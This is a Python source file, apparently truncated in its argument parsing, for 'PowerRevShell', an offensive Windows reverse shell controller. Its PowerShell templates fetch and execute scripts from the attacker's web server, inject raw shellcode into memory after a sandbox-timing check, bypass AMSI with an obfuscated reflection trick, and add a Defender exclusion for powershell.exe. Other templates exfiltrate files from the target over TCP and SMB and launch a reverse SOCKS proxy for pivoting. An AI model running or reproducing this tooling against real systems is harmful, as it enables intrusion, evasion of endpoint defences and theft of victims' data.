#! /usr/bin/env python3

import subprocess
import threading
import socket
import argparse
import os
import time
import math
import hashlib
import readline
import tempfile
from pathlib import Path
from colorama import Fore, init
from http.server import HTTPServer, SimpleHTTPRequestHandler
from socks_proxy_class import QuietHandler, ProxyHandler

readline.parse_and_bind('tab: complete')
stop_resize = False

def cmd_socks_stop(socks_id): #command to stop the reverse socks proxy
    cmd = """
try{
    kill %s
    $StreamWriter.WriteLine("[+] Socks Proxy stopped successfully.")
    $StreamWriter.Flush()
}catch{
    #$StreamWriter.WriteLine("[-] Error while stopping Socks Proxy.")
    $StreamWriter.Flush()
}
""" %(socks_id)
    return cmd

def cmd_socks_list(): #command to check for running reverse socks proxy
    cmd = """
($proxy).id
($proxy).processname
"""
    return cmd

def cmd_socks(ip,port): #command to start the reverse socks proxy
    cmd = """
try{
    $proxy = start-process powershell -ArgumentList "-noexit -command `"IEX (New-Object System.Net.WebClient).DownloadString('http://%s:8000/PowerProxy.ps1');Start-ReverseSocksProxy %s -Port %s`"" -WindowStyle Minimized -passthru
    $StreamWriter.WriteLine("[*] Starting socks Proxy on port %s.")
    $StreamWriter.Flush()
}catch{
    $message = $_ | Out-String
    $StreamWriter.WriteLine("[-] $message")
    $StreamWriter.Flush()
}
""" %(ip,ip,port,port)
    return cmd
def cmd_payload(blob,size): #command to execute the .txt payload
    cmd = """
$id = get-random
$code = @"
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace Felpa
{
    public class Program$id
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        public static void Run()
        {
            DateTime t1 = DateTime.Now;
            Sleep(3000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 2.5)
            {
                return;
            }

            byte[] b = new byte[%i] { %s };
            Array.Reverse(b);
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(b, 0, addr, %i);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == null)
            {
                Environment.Exit(0);
            }
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp
$StreamWriter.WriteLine("[*] Starting execution")
$StreamWriter.Flush()
IEX "[Felpa.Program$id]::Run()"
""" %(size,blob,size)
    return cmd

def cmd_get(full_path,file): #command to run the upload from target machine to local machine file
    cmd = """
try {
    if (Test-Path %s -PathType Leaf){
        $bytes = [System.IO.File]::ReadAllBytes("%s")
        $n_chunks = [math]::Ceiling($bytes.Length / 8192)
        $StreamWriter.WriteLine("[FILE_SIZE] "+$bytes.Length)
        $StreamWriter.Flush()
        $chunk = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
        $data = $encoding.GetString($buffer, 0, $chunk)
        $end = 0
        for ($a=0;$a -lt $n_chunks-1; $a++){
            $start = $a*(8192+1)
            $end = $start+8192
            $bytetosend = $bytes[$start..$end] -join ","
            do{
                $StreamWriter.WriteLine("[BYTES] "+$bytetosend+" [ENDBYTES]")
                $StreamWriter.Flush()
                $chunk = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
                $data = $encoding.GetString($buffer, 0, $chunk)
                if ($data -eq '[OKBYTES]'){
                    $mystream = [IO.MemoryStream]::new([byte[]][char[]]$bytetosend)
                    $checksum = (Get-FileHash -InputStream $mystream -Algorithm MD5).Hash
                    $mystream.dispose()
                    Remove-Variable mystream
                    $StreamWriter.WriteLine("[SUMCHECK] "+$checksum)
                    $StreamWriter.Flush()
                    $chunk = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
                    $data = $encoding.GetString($buffer, 0, $chunk)
                    if ($data -eq '[OKSUM]'){
                        break
                    }
                }
            }while($True -and $TCPClient.Connected)
        }
        $end += 1
        $bytetosend = $bytes[$end..$bytes.Length] -join ","
        do{
            $StreamWriter.WriteLine("[BYTES] "+$bytetosend+" [ENDBYTES]")
            $StreamWriter.Flush()
            $chunk = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
            $data = $encoding.GetString($buffer, 0, $chunk)
            if ($data -eq '[OKBYTES]'){
                $mystream = [IO.MemoryStream]::new([byte[]][char[]]$bytetosend)
                $checksum = (Get-FileHash -InputStream $mystream -Algorithm MD5).Hash
                $mystream.dispose()
                $StreamWriter.WriteLine("[SUMCHECK] "+$checksum)
                $StreamWriter.Flush()
                $chunk = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
                $data = $encoding.GetString($buffer, 0, $chunk)
                if ($data -eq '[OKSUM]'){
                    write-host 'DONE'
                    $StreamWriter.WriteLine("[DONE]")
                    break
                }
            }

        }while($True -and $TCPClient.Connected)
        Remove-Variable bytes, n_chunks, a, start, end, mystream
    }else{
        $StreamWriter.WriteLine('[-] Failed to upload %s, file do not exist in the current directory.')
    }

}catch {
    $message = $_ | Out-String
    $StreamWriter.WriteLine('[-] Failed to upload %s '+$message)
}
""" %(full_path,full_path,file,file)
    return cmd

def cmd_put(path,file): #command to run the download from local machine to target machine file
    cmd = """
$file = "%s"
if (Test-Path $file -PathType Leaf){
    Remove-Item -Path $file -Force
    $StreamWriter.WriteLine('[*] %s Deleting old file.')
}
""" %(path+'\\'+file,file)
    return cmd

def cmd_close(excluded): #command to close the reverse shell and check if powershell was excluded to restore the defualt settings
    if (excluded):
        cmd = """
try{
    Remove-MpPreference -ExclusionProcess "powershell.exe" -Force 2>&1
}catch {}
$StreamWriter.Close()
stop-process (Get-Process -PID $pid).ID -Force 2>&1
"""
    else:
        cmd = """
$StreamWriter.Close()
stop-process (Get-Process -PID $pid).ID -Force 2>&1
"""
    return cmd

def cmd_exclude(): #command to exluce all powershell process from defender
    cmd = """
Set-MpPreference -ExclusionProcess "powershell.exe" -Force 2>&1
"""
    return cmd

def cmd_amsibypass(): #command to bypass amsi in the current powershell session
    cmd = """
try {
    [byte[]] $b1 = 83,0,121,0,115,0,116,0,101,0,109,0,46,0,77,0,97,0,110,0,97,0,103,0,101,0,109,0,101,0,110,0,116,0,46,0,65,0,117,0,116,0,111,0,109,0,97,0,116,0,105,0,111,0,110,0,46,0,65,0,109,0,115,0,105,0,85,0,116,0,105,0,108,0,115,0
    [byte[]] $b2 = 97,0,109,0,115,0,105,0,73,0,110,0,105,0,116,0,70,0,97,0,105,0,108,0,101,0,100,0
    [Ref].Assembly.GetType([System.Text.Encoding]::Unicode.GetString($b1)).GetField([System.Text.Encoding]::Unicode.GetString($b2),'NonPublic,Static').SetValue($null,$true)
    $StreamWriter.WriteLine('[+] AMSI Bypassed Successfully!')
    } catch {
        $StreamWriter.WriteLine('[-] Failed.')
    }
"""
    return cmd

def cmd_downfile(HOST,WEBPORT,file,path): #command to downlaod a file from local machine to target machine
    cmd = """
try {
    (New-Object System.Net.WebClient).DownloadFile('http://%s:%i/%s','%s') 2>&1
    $StreamWriter.WriteLine('[+] %s Downloaded Successfully!')
} catch {
    $message = $_
    $StreamWriter.WriteLine('[-] Failed to download %s :'+$message)
}
""" %(HOST,WEBPORT,file,path+'\\'+file,file,file)
    return cmd

def cmd_loadscript(HOST,WEBPORT,script): #command to load a script from local machine to target machine
    cmd = """
try {
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://%s:%i/%s') 2>&1
    #start-sleep -Milliseconds 1000
    $StreamWriter.WriteLine('[+] %s Loaded Successfully!')
} catch {
    $message = $_
    $StreamWriter.WriteLine('[-] Failed to load %s :'+$message)
}
""" %(HOST,WEBPORT,script,script,script)
    return cmd

def cmd_smb_get(full_path,HOST,file): #command to transfer a file from target machine to local machine using smb protocol
    cmd = """
try {
    if (Test-Path %s) {
        Copy-Item -Path %s -Destination \\\\%s\\kali\\%s -Recurse
        $StreamWriter.WriteLine('[+] %s Downloaded Successfully!'+$message)
    }else{
        $StreamWriter.WriteLine('[-] Failed to upload %s, file do not exist in the current directory.')
    }
}catch {
    $message = $_ | Out-String
    $StreamWriter.WriteLine('[-] Failed to upload %s '+$message)
}
""" %(full_path,full_path,HOST,file,file,file,file)
    return cmd

# Use OpenSSL to create a server cert. Returns (cert_path, key_path)
def create_ssl_cert(cert_path=None, key_path=None, temporary=True):
    # Create paths to output cert and key
    if temporary:
        print(Fore.CYAN + "[*] " + Fore.RESET + "Creating temporary SSL cert")
        domain = "example.local"
        __, cert_path = tempfile.mkstemp()
        __, key_path = tempfile.mkstemp()
        print(Fore.GREEN + "[+] " + Fore.RESET + f"Path to temporary SSL cert: {cert_path}")
        print(Fore.GREEN + "[+] " + Fore.RESET + f"Path to temporary SSL key: {key_path}")
    else:
        print(Fore.CYAN + "[*] " + Fore.RESET + "Creating SSL cert")
        # OpenSSL wants this
        try:
            domain = os.uname().nodename
        except:
            domain = "example.local"
        # Create certificate path
        if cert_path != None:
            if os.path.exists(cert_path):
                temp_cert_path = os.path.join(tempfile.gettempdir(), os.path.splitext(sys.argv[0])[0]) + ".pem"
                print(Fore.YELLOW + "[*] " + Fore.RESET + f"File at {cert_path} already exists! Saving cert to {temp_cert_path}")
                cert_path = temp_cert_path
            cert_path = os.path.abspath(cert_path)
        else:
            if os.access(os.getcwd(), os.W_OK):
                cert_path = os.path.join(os.getcwd(), "cert.pem")
            else:
                cert_path = os.path.join(tempfile.gettempdir(), "cert.pem")
        # Create key path
        if key_path !=  None:
            if os.path.exists(key_path):
                temp_key_path = os.path.join(tempfile.gettempdir(), os.path.splitext(sys.argv[0])[0]) + ".key"
                print(Fore.YELLOW + "[*] " + Fore.RESET + f"File at {key_path} already exists! Saving cert to {temp_key_path}")
                key_path = temp_key_path
            key_path = os.path.abspath(key_path)
        else:
            if os.access(os.getcwd(), os.W_OK):
                key_path = os.path.join(os.getcwd(), "cert.key")
            else:
                key_path = os.path.join(tempfile.gettempdir(), "cert.key")
        print(Fore.GREEN + "[+] " + Fore.RESET + f"Path to SSL cert: {cert_path}")
        print(Fore.GREEN + "[+] " + Fore.RESET + f"Path to SSL key: {key_path}")
    
    # Now run OpenSSL
    openssl = f'openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout {key_path} -out {cert_path} -batch -subj /CN={domain}'
    openssl_result = subprocess.run(openssl.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    if openssl_result.returncode == 0:
        print(Fore.GREEN + "[+] " + Fore.RESET + f"SSL cert created successfully!")
    else:
        print(Fore.YELLOW + "[*] " + Fore.RESET + f"OpenSSL returncode not zero! Possible error!")

    return cert_path, key_path

def func(conn,file,file_size): #function for the get functionality
    size_sent = 1
    ti = time.time()
    conn.sendall('[OK]'.encode()) #start the conversation
    while (True):
        data = ""
        while (True):
            part = conn.recv(1024).decode()
            if ('[DONE]' in part): #check for the end of the file
                print(" ")
                print_color(f'[+] File: {file} Transferred correctly!')
                return ' '
            data += part
            if (len(part) < 1024): #check if there is still some message left
                break
        if ('[ENDBYTES]' in data and data.startswith('[BYTES]')): #check if data was sent correctly
            conn.sendall('[OKBYTES]'.encode())
            byte = data[8:len(data)-13].strip()
            data = conn.recv(1024).decode()
            check_sum = ''
            if (data.startswith('[SUMCHECK]')): #check for the checksum if data is sent correctly
                check_sum = data.split(' ')[1].lower().strip()
                if (check_sum == hashlib.md5(byte.encode()).hexdigest()):
                    ar = byte.split(',')
                    byte_list = []
                    for by in ar:
                        try:
                            byte_list.append(int(by))
                        except Exception as e:
                            print("")
                            print(ar)
                            print(Fore.RED + "[-] " + Fore.RESET + f"Error while saving file.")
                            print(e)
                            return ' '
                    size_sent += len(byte_list)
                    save_file(byte_list,file,int(file_size),ti,size_sent)
                    conn.sendall('[OKSUM]'.encode())
                else:
                    conn.sendall('[ERROR]'.encode())
            else:
                conn.sendall('[ERROR]'.encode())
        else:
            conn.sendall('[ERROR]'.encode())

def send_data(conn,cmd,strip=True,file=''): #command to send command to the target machine
    data = ""
    while (True):
        #size = f"[BUFFER] {len(cmd)}"
        #conn.sendall(size.encode()) #send buffer size
        #if (conn.recv(1024).decode() != '[OKSIZE]'): #wait for callback
        #    continue
        #else:
        conn.sendall(cmd.encode()) #send actual command
        if (conn.recv(1024).decode() != '[OKCMD]'): #wait for callback
            continue
        else:
            checksum = f"[CHECKSUM] {hashlib.md5(cmd.encode()).hexdigest()}"
            conn.sendall(checksum.encode()) # send the checksum
            if (conn.recv(1024).decode() == '[OKSUM]'): #wait for callback and check errors
                break
    while (True):
        part = conn.recv(1024).decode()
        data += part
        if (len(part) < 1024):
            break
    if (data.startswith('[FILE_SIZE]')):
        file_size = data.split(' ')[1]
        return func(conn,file,file_size)
    if (strip):
        return data[4:].strip()
    else:
        return data

def resize_terminal(): #function for resizing the powershell view
    staring_columns, starting_rows = os.get_terminal_size()
    subprocess.Popen(["stty", "rows", f"{starting_rows}", "columns", f"{staring_columns+31}"])
    time.sleep(0.1)
    global stop_resize
    while (True):
        if (stop_resize):
            subprocess.Popen(["stty", "rows", f"{starting_rows}", "columns", f"{staring_columns}"])
            break
        old_columns, old_rows = os.get_terminal_size()
        time.sleep(0.5)
        new_columns, new_rows = os.get_terminal_size()
        if (old_columns != new_columns or old_rows != new_rows):
            #print("")
            #print(Fore.GREEN + "[+] " + Fore.RESET + f"Resized columns={new_columns+31} rows={new_rows}")
            #print("")
            subprocess.Popen(["stty", "rows", f"{new_rows}", "columns", f"{new_columns+31}"])
            time.sleep(0.1)

def server(HOST:str,PORT:int,WEBPORT:int,CHECK_HTTP:bool,CHECK_SMB:bool,SHARE:str) -> None: #main shell function
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, PORT))
            s.listen()
        except Exception as e:
            print(Fore.YELLOW + str(e))
            quit()

        print(Fore.GREEN + "[+] " + Fore.RESET + f"Waiting for connection on port: {PORT}")
        conn, addr = s.accept()
        with conn:
            print(Fore.GREEN +"[+] " + Fore.RESET + f"Connected by {addr}")

            print("")
            print("    ____                                         _____ __         ____")
            print("   / __ \____ _      _____  _____" + Fore.YELLOW + "________ _   __" + Fore.RESET + "/ ___// /_  ___  / / /")
            print("  / /_/ / __ \ | /| / / _ \/ ___/" + Fore.YELLOW + " ___/ _ \ | / /" + Fore.RESET + "\__ \/ __ \/ _ \/ / /") 
            print(" / ____/ /_/ / |/ |/ /  __/ /  " + Fore.YELLOW + "/ /  /  __/ |/ /" + Fore.RESET + "___/ / / / /  __/ / /")  
            print("/_/    \____/|__/|__/\___/_/Fe" + Fore.YELLOW + "/_/lpa\___/|___/" + Fore.RESET + "/____/_/ /_/\___/_/_/")   
            print("")
            print("------------------------------------------------------------------")
            print("      PowerrevShell - Windows reverse shell | Fedami")
            print("     https://github.com/Fedami/powerrevshell---rev.ps1")
            print("")                                                                                                                                                              
            whoami = send_data(conn,"whoami")
            groups = send_data(conn,"whoami /groups")
            noice = ""
            if (whoami == "nt authority\system" or 'admin' in groups.lower()):
                noice = "(~^-^)~"
            print(Fore.GREEN + "[+] " + Fore.RESET + f"Connected as: [{whoami}] " + Fore.YELLOW + f"{noice}")
            hostname = send_data(conn,"hostname")
            print(Fore.GREEN + "[+] " + Fore.RESET + f"Hostname: [{hostname}]")
            OS = send_data(conn,"(Get-WmiObject -class Win32_OperatingSystem).Caption")
            print(Fore.GREEN + "[+] " + Fore.RESET + f"OS: [{OS}]")
            OSVersion = send_data(conn,"[System.Environment]::OSVersion.Version -split '\n'")
            print(Fore.GREEN + "[+] " + Fore.RESET + f"OSVersion: [{OSVersion}]")
            ProcessName = send_data(conn,"(Get-Process -PID $pid).ProcessName")
            print(Fore.GREEN + "[+] " + Fore.RESET + f"Process: [{ProcessName}]")
            PID = send_data(conn,"(Get-Process -PID $pid).ID")
            print(Fore.GREEN + "[+] " + Fore.RESET + f"PID: [{PID}]")
            print('')
            print(Fore.YELLOW + "[*] " + Fore.RESET + "Type 'menu' for command option.")

            excluded = False
            running_socks = False
            socks_pid = ''
            t4 = threading.Thread(target=resize_terminal, daemon = True)
            t4.start()
            while True:
                file = ''
                print("")
                path = send_data(conn,"(pwd).Path")
                cmd = input(Fore.GREEN + "PS (" + Fore.BLUE + f"{whoami}@{hostname}" + Fore.GREEN + ")-[" + Fore.RESET + f"{path}" + Fore.GREEN + "] > "+ Fore.RESET)
    
                if (cmd == 'menu'):
                    if (CHECK_HTTP):
                        print(Fore.CYAN + "[*] " + Fore.RESET + f" load          <FILE.ps1>            -> Load powershell script using http web server on port: {WEBPORT}.")
                        print(Fore.CYAN + "[*] " + Fore.RESET + f" down-file     <FILE>                -> Download file to the client using http web server on port: {WEBPORT}.")
                    else:
                        print(Fore.CYAN + "[*] " + Fore.RESET + f" load          <FILE.ps1>            -> Load powershell script http web server (start web server with 'python -m http.server <PORT>')")
                        print(Fore.CYAN + "[*] " + Fore.RESET + f" down-file     <FILE>                -> Download file to the client using http web server (start web server with 'python -m http.server <PORT>')")
                    print(Fore.CYAN + "[*] " + Fore.RESET + f" get           <FILE>                -> Download a file to this kali machine using TCPSocket (Size < 10MB)")
                    print(Fore.CYAN + "[*] " + Fore.RESET + f" put           <FILE>                -> Download a file to the target machine using TCPSocket (Size < 10MB)")
                    if (CHECK_SMB):
                        print(Fore.CYAN + "[*] " + Fore.RESET + f" smb-get       <FILE>                -> Transfer file to the folder ./{SHARE} on this machine.")
                    else:
                        print(Fore.CYAN + "[*] " + Fore.RESET + f" smb-get       <FILE>                -> Transfer file to the smb server folder (start smb server with 'impacket-smbserver -port <PORT> -smb2support kali <FOLDERNAME>')")
                    print(Fore.CYAN + "[*] " + Fore.RESET + f" socks-start   <L-PORT> <P-PORT>     -> Start reverse socks proxy on local port <L-PORT> and proxy port <P-PORT> [Default L-PORT:8080, P-PORT:1080].")
                    print(Fore.CYAN + "[*] " + Fore.RESET + f" socks-stop                          -> Stop current socks proxy.")
                    print(Fore.CYAN + "[*] " + Fore.RESET + f" socks                               -> Show current active socks proxy info.")
                    print(Fore.CYAN + "[*] " + Fore.RESET + " payload       <FILE>                -> Try to execute bytes paylaod (<FILE> must contains only the bytes separated by ',')")
                    print(Fore.CYAN + "[*] " + Fore.RESET + " menu                                -> Show this page.")
                    print(Fore.CYAN + "[*] " + Fore.RESET + " exclude                             -> Try to exluce powershell process from defender.")
                    print(Fore.CYAN + "[*] " + Fore.RESET + " amsi-bypass                         -> Try to bypass amsi.")
                    print(Fore.CYAN + "[*] " + Fore.RESET + " close                               -> Kill process and exit.")
                    continue
                elif (cmd == 'close'):
                    if (running_socks):
                        print(Fore.CYAN + "[*] " + Fore.RESET + f"Trying to stop socks proxy.")
                        running_socks = False
                        cmd = cmd_socks_list()
                        data = send_data(conn,cmd,True)
                        socks_pid = data.split("\n")[0]
                        proxy_handler.kill_local_process()
                        while (not proxy_handler.socks_stopped):
                            time.sleep(0.5)
                        t3.join()
                        cmd = cmd_socks_stop(socks_pid)
                        socks_pid = ''
                        del proxy_handler
                        data = send_data(conn,cmd,False)
                        print_color(data)
                    print(Fore.GREEN + "[+] " + Fore.RESET + "(~^w^)~ Bye!")
                    data = send_data(conn,cmd_close(excluded),False)
                    conn.close()
                    s.close()
                    global stop_resize
                    stop_resize = True
                    t4.join()
                    quit()
                elif (cmd == 'amsi-bypass'):
                    print(Fore.CYAN + "[*] " + Fore.RESET + "Trying to bypass amsi.")
                    cmd = cmd_amsibypass()
                elif (cmd == 'exclude'):
                    print(Fore.CYAN + "[*] " + Fore.RESET + "Trying to exclude powershell process from defender.")
                    cmd = cmd_exclude()
                    excluded = True
                    data = send_data(conn,cmd,False)
                    if ("You don't have enough permissions" in data):
                        print_color("[-] You don't have enough permissions.")
                    else:
                        print_color("[+] Defender excluded Successfully.")
                    continue
                elif (cmd.startswith('down-file')):
                    try:
                        file = cmd.split(' ')[1]
                    except:
                        print(Fore.RED + "[-] " + Fore.RESET + "Wrong usage of command: down_file <FILENAME>")
                        continue
                    print(Fore.CYAN + "[*] " + Fore.RESET + f"Trying to downlaod {file}")
                    cmd = cmd_downfile(HOST,WEBPORT,file,path)
                elif (cmd.startswith('load')):
                    try:
                        script = cmd.split(' ')[1]
                    except:
                        print(Fore.RED + "[-] " + Fore.RESET + "Wrong usage of command: load <FILENAME.ps1>")
                        continue
                    print(Fore.CYAN + "[*] " + Fore.RESET + f"Trying to load {script}")
                    cmd = cmd_loadscript(HOST,WEBPORT,script)
                elif (cmd.startswith('put')):
                    try:
                        file = cmd.split(' ')[1]
                    except:
                        print(Fore.RED + "[-] " + Fore.RESET + "Wrong usage of command: put <FILENAME>")
                        continue
                    byte = []
                    if (not os.path.exists(file)):
                        print(Fore.RED + "[-] " + Fore.RESET + f"{file} Do not exists.")
                        continue
                    l = 0
                    app = 0
                    t = 0.0
                    with open(file,'rb') as r:
                        print(Fore.CYAN + "[*] " + Fore.RESET + f"Trying to downlaod {file}")
                        app = r.read()
                        t = time.time()
                        data = send_data(conn,cmd_put(path,file),False)
                        print_color(data)
                        for b in app:
                            byte.append(str(b))
                            if (len(byte) >= 32768):
                                l += len(byte)
                                byte_to_send = ','.join(byte)
                                byte = []
                                cmd = f"[DOWN] [CHUNK] {byte_to_send.strip()}"
                                elapsed = time.time()-t
                                down_speed = round(float(l)/elapsed,2)
                                #print("                                                                                                                         ",end="\r")
                                print(Fore.CYAN + "[+] " + Fore.RESET + f"Sent {round(float(l)/float(1024),2)} of {round(float(len(app))/float(1024),2)} KB " + Fore.YELLOW + f"{down_speed} Byte/S " + Fore.RESET + f"{round(float(l)/float(len(app))*100,2)}% Remaining: {int((len(app)-l)/down_speed)} s",end="\r")
                                data = send_data(conn,cmd,False)
                    byte_to_send = ','.join(byte)
                    l += len(byte)
                    cmd = f"[DOWN] [CLOSE] {byte_to_send.strip()}"
                    data = send_data(conn,cmd,False)
                    elapsed = time.time()-t
                    print(Fore.CYAN + "[+] " + Fore.RESET + f"Sent {round(float(l)/float(1024),2)} of {round(float(len(app))/float(1024),2)} KB " + Fore.CYAN + f"{round(float(l)/elapsed,2)} Byte/S " + Fore.RESET + f"{round(float(l)/float(len(app))*100,2)}% Elapsed: {round(elapsed,2)} s",end="\n")
                    print_color(data)
                    continue
                elif (cmd.startswith('get')):
                    try:
                        file = cmd.split(' ')[1]
                    except:
                        print(Fore.RED + "[-] " + Fore.RESET + "Wrong usage of command: get <FILENAME>")
                        continue
                    full_path = path+'\\'+file
                    print(Fore.CYAN + "[*] " + Fore.RESET + f"Trying to upload {file}")
                    if (os.path.exists(file)):
                        print(Fore.YELLOW + "[*] " + Fore.RESET + f"{file} Deleting old file.")
                        os.remove(file)
                    data = send_data(conn,cmd_get(full_path,file),False,file)
                    print_color(data)
                    continue
                elif (cmd.startswith('smb-get')):
                    try:
                        file = cmd.split(' ')[1]
                    except:
                        print(Fore.RED + "[-] " + Fore.RESET + "Wrong usage of command: smb_get <FILENAME>")
                        continue
                    full_path = path+'\\'+file
                    print(Fore.CYAN + "[*] " + Fore.RESET + f"Trying to copy {file} to smbserver share.")
                    cmd = cmd_smb_get(full_path,HOST,file)
                elif (cmd.startswith('socks-start')):
                    command = cmd.split(" ")
                    len_command = len(command)
                    if (len_command == 1):
                        listen_port = 8080
                        proxy_port = 1080
                    elif (len_command == 2):
                        listen_port = command[1]
                        proxy_port = 1080
                    else:
                        listen_port = command[1]
                        proxy_port = command[2]

                    if (running_socks):
                        print(Fore.RED + "[*] " + Fore.RESET + f"Socks already running.")
                    else:
                        print(Fore.CYAN + "[*] " + Fore.RESET + f"Trying to start socks proxy on port 8080.")
                        proxy_handler = ProxyHandler("127.0.0.1", proxy_port, "", listen_port)
                        proxy_handler.shutdown_flag.clear()
                        ssl_cert, ssl_key = create_ssl_cert(cert_path=None, key_path=None, temporary=True)
                        proxy_handler.set_ssl_context(certificate=ssl_cert,private_key=ssl_key,verify=False)
                        t3 = threading.Thread(target=proxy_handler.serve, daemon = True)
                        t3.start()
                        cmd = cmd_socks(HOST,listen_port)
                        running_socks = True
                        data = send_data(conn,cmd,False)
                        print_color(data)
                        while (not proxy_handler.socks_started):
                            time.sleep(0.5)
                    continue
                elif (cmd.startswith('socks-stop')):
                    if (running_socks):
                        print(Fore.CYAN + "[*] " + Fore.RESET + f"Trying to stop socks proxy.")
                        running_socks = False
                        cmd = cmd_socks_list()
                        data = send_data(conn,cmd,True)
                        socks_pid = data.split("\n")[0]
                        proxy_handler.kill_local_process()
                        while (not proxy_handler.socks_stopped):
                            time.sleep(0.5)
                        t3.join()
                        cmd = cmd_socks_stop(socks_pid)
                        socks_pid = ''
                        del proxy_handler
                    else:
                        print_color("[-] No Socks server running.")
                        continue
                elif (cmd.startswith('socks')):
                    if (running_socks):
                        cmd = cmd_socks_list()
                        data = send_data(conn,cmd,True)
                        socks_pid = data.split("\n")[0]
                        socks_process = data.split("\n")[1]
                        print_color("[*] Current Socks running: ")
                        print_color("[+] PID: "+socks_pid)
                        print_color("[+] ProcessName: "+socks_process)
                        print_color(f"[+] Port: {listen_port}")
                    else:
                        print_color("[-] No Socks server running.")
                    continue
                elif (cmd.startswith('payload')):
                    try:
                        payload = cmd.split(' ')[1]
                    except:
                        print(Fore.RED + "[-] " + Fore.RESET + "Wrong usage of command: payload <FILENAME>")
                        continue
                    if (not os.path.exists(payload)):
                        print(Fore.RED + "[-] " + Fore.RESET + f"{file} Do not exists.")
                        continue
                    with open(payload,'r') as r:
                        blob = ''
                        pay = r.read().split(',')[::-1]
                        size = len(pay)
                        for b in pay:
                            blob += b.strip()+','
                        print(Fore.CYAN + "[*] " + Fore.RESET + f"Trying to execute payload {payload}")
                        cmd = cmd_payload(blob[:-1],size)
                elif (cmd == ''):
                    continue
                data = send_data(conn,cmd,False)
                print_color(data)

def print_color(data,file=''): #main function to print with awesome color format XD
    if (len(data[4:]) > 0):
        if (data.startswith("[+]")):
            print(Fore.GREEN + "[+] " + Fore.RESET + data[4:].strip())
        elif (data.startswith("[-]")):
            print(Fore.RED + "[-] " + Fore.RESET + data[4:].strip())
        elif (data.startswith("[*]")):
            print(Fore.YELLOW + "[*] " + Fore.RESET + data[4:].strip())

def save_file(byte_list,name,file_size,ti,size_sent): #function to save file to local machine
    with open(name,'ab') as w:
        w.write(bytes(byte_list))
    w.close()
    elapsed = time.time() - ti
    up_speed = round(size_sent/elapsed,2)
    print(Fore.CYAN + "[+] " + Fore.RESET + f"Received {round(size_sent/1024,2)} KB of {round(file_size/1024,2)} KB " + Fore.YELLOW + f"{up_speed} Byte/S " + Fore.RESET + f"{round(float(size_sent)/float(file_size)*100,2)}% Remaining: {int((file_size-size_sent)/up_speed)} s",end="\r")
    return len(byte_list)


def get_local_ip(): #grab the local ip
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(('8.8.8.8', 80))

        return sock.getsockname()[0]
    except socket.error:
        try:
            return socket.gethostbyname(socket.gethostname())
        except socket.gaierror:
            return '127.0.0.1'
    finally:
        sock.close()

def webServer(webport:int) -> None: #start an http web server with python to implement different functionality
    print(Fore.GREEN + "[+] " + Fore.RESET + f"Starting Webserver on port {webport} http://0.0.0.0: {webport}")
    httpd = HTTPServer(('0.0.0.0', webport), QuietHandler)
    httpd.serve_forever()

def smbserver(name:str,port:int) -> None: #start smb server to implement different functionality
    try:
        print(Fore.GREEN + "[+] " + Fore.RESET + f"Starting SMBServer on port {port}, ShareName: {name}.")
        subprocess.run([f'impacket-smbserver -port {port} -smb2support kali ./{name} 1>/dev/null'],shell=True,check=True)
    except:
        print(Fore.YELLOW + "[-] " + Fore.RESET + "Please Install impacket at https://github.com/SecureAuthCorp/impacket")
        quit()

def kill(port): #kill running process that are running on the desidered ports
    process = subprocess.Popen(['netstat','-ltnup'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = process.communicate()
    for p in port:
        for line in out.decode().split('\n'):
            if (str(p) in line):
                ap = line.split('/')[0].split(' ')
                PID = ap[len(ap)-1]
                subprocess.Popen([f'kill {PID}'],shell=True)
    time.sleep(0.2)
    return

def check_port(ports): #check if specified ports are free
    netstat = subprocess.Popen(['ss','-lntup'],stdout=subprocess.PIPE)
    p = str(netstat.communicate())
    port_arr = []
    for port in ports:
        print(Fore.CYAN + "[+] " + Fore.RESET + f"Checking ports {port}")
        if (str(port) in p):
            print(Fore.YELLOW + "[-] " + Fore.RESET + f"{port} already in use.")
            port_arr.append(port)
    return port_arr

def quit() -> None: #exit program
    print(Fore.RED + "[+] " + Fore.RESET + "Quitting.")
    raise SystemExit(0)

def main() -> None: #main function with argparse
    lip = (get_local_ip())
    parser = argparse.ArgumentParser(description='PowerRevShell')
    parser.add_argument('-f',
                        metavar='smb folder for transfer and execute funciontality',
                        type=str,
                        default='root',
                        help="Enter folder name [Default: root]")
    parser.add_argument('-i',
                        metavar='local ip',
                        type=str,
                        default=lip,
                        help="Enter your local IP [Default: "+lip+"]")
    parser.add_argument('-p',
                        metavar='port',
                        type=int,
                        default='9001',
                        help='listener port for reverse shell [Default: 9001]')
    parser.add_argument('-wp',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for http server [Default: 8000]')
    parser.add_argument('-sp',
                        metavar='smbport',
                        type=int,
                        default='445',
                        help='listener port for smb server [Default: 445]')
